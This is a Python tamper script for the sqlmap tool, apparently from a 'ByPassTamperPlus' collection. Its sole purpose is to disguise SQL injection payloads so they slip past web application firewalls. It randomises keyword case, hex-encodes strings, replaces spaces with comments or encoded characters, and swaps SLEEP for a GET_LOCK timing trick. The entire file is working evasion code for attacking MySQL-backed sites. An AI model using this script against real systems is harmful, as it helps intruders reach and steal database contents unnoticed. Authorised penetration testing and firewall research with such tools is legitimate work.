#!/usr/bin/env python

"""
@Project  : ByPassTamperPlus
@File     : mysql51_bypass.py
@Author   : Tas9er / https://www.github.com/Tas9er
@IDE      : PyCharm
"""

import re
import random

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    if not payload:
        return payload

    def random_case(word):
        return "".join(c.upper() if random.getrandbits(1) else c.lower() for c in word)

    def general_obfuscate(p):
        keywords = [
            "SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "GROUP_CONCAT",
            "INFORMATION_SCHEMA", "TABLES", "COLUMNS", "TABLE_NAME", "COLUMN_NAME",
            "USER", "CURRENT_USER", "DATABASE", "AS", "LIMIT", "OFFSET",
            "CASE", "WHEN", "THEN", "ELSE", "END", "IFNULL", "GET_LOCK", "DISTINCT", "ORDER", "BY"
        ]
        for kw in keywords:
            p = re.sub(r"(?i)\b%s\b" % kw, lambda m: random_case(m.group(0)), p)

        p = re.sub(r"(?i)SUBSTRING\(", lambda m: random_case(random.choice(["MID(", "SUBSTR("])), p)

        spaces = ["/**/", "%0a", "%09", "%0b", "%0c", "+"]
        p = re.sub(r" ", lambda m: random.choice(spaces), p)

        p = re.sub(r"'([^']*)'", lambda m: "0x" + m.group(1).encode("utf-8").hex(), p)

        return p

    if "GROUP_CONCAT" in payload.upper():
        payload = re.sub(r"(?i)GROUP_CONCAT\((.*?)\)", r"GROUP_CONCAT(DISTINCT \1 ORDER BY 1)", payload)

    payload = re.sub(r"(?i)SLEEP\((\d+)\)", r"GET_LOCK(CONCAT(0x7761665f,UUID()),\1)", payload)

    payload = re.sub(r"(?i)USER\(\)", "CURRENT_USER()", payload)

    payload = general_obfuscate(payload)

    return payload
